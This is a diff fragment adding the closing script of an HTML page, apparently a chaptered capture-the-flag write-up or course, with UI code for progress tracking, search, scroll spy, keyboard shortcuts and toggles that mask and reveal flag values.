+  var done={};try{done=JSON.parse(localStorage.getItem(PKEY)||"{}")}catch(e){}
+  function paint(){
+    var n=0;
+    checks.forEach(function(c){
+      var on=!!done[c.dataset.ch];
+      c.checked=on;
+      c.closest(".nav-item").classList.toggle("done",on);
+      if(on)n++;
+    });
+    var pct=Math.round(n/checks.length*100);
+    document.getElementById("bar").style.width=pct+"%";
+    document.getElementById("pcount").textContent=n+" / "+checks.length;
+    document.getElementById("ppct").textContent=pct+"%";
+  }
+  checks.forEach(function(c){
+    c.addEventListener("click",function(e){e.stopPropagation()});
+    c.addEventListener("change",function(){
+      done[c.dataset.ch]=c.checked;
+      try{localStorage.setItem(PKEY,JSON.stringify(done))}catch(e){}
+      paint();
+    });
+  });
+  paint();
+  document.getElementById("resetProgress").addEventListener("click",function(){
+    done={};try{localStorage.setItem(PKEY,"{}")}catch(e){}paint();say("Progress reset");
+  });
+
+  /* ---------- expand / collapse all ---------- */
+  function setAll(open){
+    document.querySelectorAll(".sec-head").forEach(function(b){
+      b.setAttribute("aria-expanded",open?"true":"false");
+      b.nextElementSibling.hidden=!open;
+    });
+  }
+  document.getElementById("expandAll").addEventListener("click",function(){setAll(true)});
+  document.getElementById("collapseAll").addEventListener("click",function(){setAll(false)});
+
+  /* ---------- scroll spy ---------- */
+  var navItems=Array.prototype.slice.call(document.querySelectorAll(".nav-item"));
+  var chapters=Array.prototype.slice.call(document.querySelectorAll(".chapter"));
+  if("IntersectionObserver" in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(!en.isIntersecting)return;
+        navItems.forEach(function(n){n.classList.toggle("active",n.dataset.target===en.target.id)});
+      });
+    },{rootMargin:"-70px 0px -70% 0px",threshold:0});
+    chapters.forEach(function(c){io.observe(c)});
+  }
+
+  /* ---------- search ---------- */
+  var input=document.getElementById("search"),count=document.getElementById("searchCount");
+  var index=chapters.map(function(c){
+    return {el:c,item:document.querySelector('.nav-item[data-target="'+c.id+'"]'),
+            text:(c.dataset.title+" "+c.textContent).toLowerCase()};
+  });
+  function clearMarks(){
+    document.querySelectorAll("mark.hit").forEach(function(m){
+      var p=m.parentNode;m.replaceWith(document.createTextNode(m.textContent));p.normalize();
+    });
+  }
+  function run(){
+    var q=input.value.trim().toLowerCase();
+    clearMarks();
+    if(!q){
+      index.forEach(function(r){r.item.style.display="";r.el.style.display=""});
+      count.textContent="";return;
+    }
+    var hits=0,first=null;
+    index.forEach(function(r){
+      var hit=r.text.indexOf(q)!==-1;
+      r.item.style.display=hit?"":"none";
+      r.el.style.display=hit?"":"none";
+      if(hit){hits++;if(!first)first=r;}
+    });
+    count.textContent=hits?hits+" chapter"+(hits>1?"s":""):"no match";
+    if(first&&hits===1){first.el.scrollIntoView({block:"start"});}
+  }
+  var t=null;
+  input.addEventListener("input",function(){clearTimeout(t);t=setTimeout(run,140)});
+  input.addEventListener("keydown",function(e){
+    if(e.key==="Escape"){input.value="";run();input.blur();}
+    if(e.key==="Enter"){var vis=index.filter(function(r){return r.item.style.display!=="none"});if(vis.length){vis[0].el.scrollIntoView({block:"start"})}}
+  });
+
+  /* ---------- keyboard ---------- */
+  document.addEventListener("keydown",function(e){
+    var typing=/^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+    if(e.key==="/"&&!typing){e.preventDefault();input.focus();input.select();}
+  });
+
+  /* ---------- mobile sidebar ---------- */
+  var sidebar=document.getElementById("sidebar");
+  document.getElementById("burger").addEventListener("click",function(){sidebar.classList.toggle("open")});
+  navItems.forEach(function(n){n.addEventListener("click",function(){sidebar.classList.remove("open")})});
+
+  /* ---------- flag reveal ---------- */
+  document.querySelectorAll(".flag .reveal").forEach(function(b){
+    b.addEventListener("click",function(){
+      var flag=b.closest(".flag"),v=flag.querySelector(".v");
+      var val=v.dataset.value;
+      var on=flag.classList.toggle("revealed");
+      v.innerHTML=on?'<span>'+val+'</span>':'<span class="masked">••••••••••••••••••••••••••••••••</span>';
+      b.textContent=on?"hide":"reveal";
+    });
+  });
+
+  /* ---------- back to top ---------- */
+  var topBtn=document.getElementById("toTop");
+  window.addEventListener("scroll",function(){
+    topBtn.classList.toggle("show",window.scrollY>600);
+  },{passive:true});
+  topBtn.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
+
+  /* ---------- deep links ---------- */
+  if(location.hash){
+    var target=document.querySelector(location.hash);
+    if(target)setTimeout(function(){target.scrollIntoView({block:"start"})},60);
+  }
+})();
+</script>
+</body>
+</html>
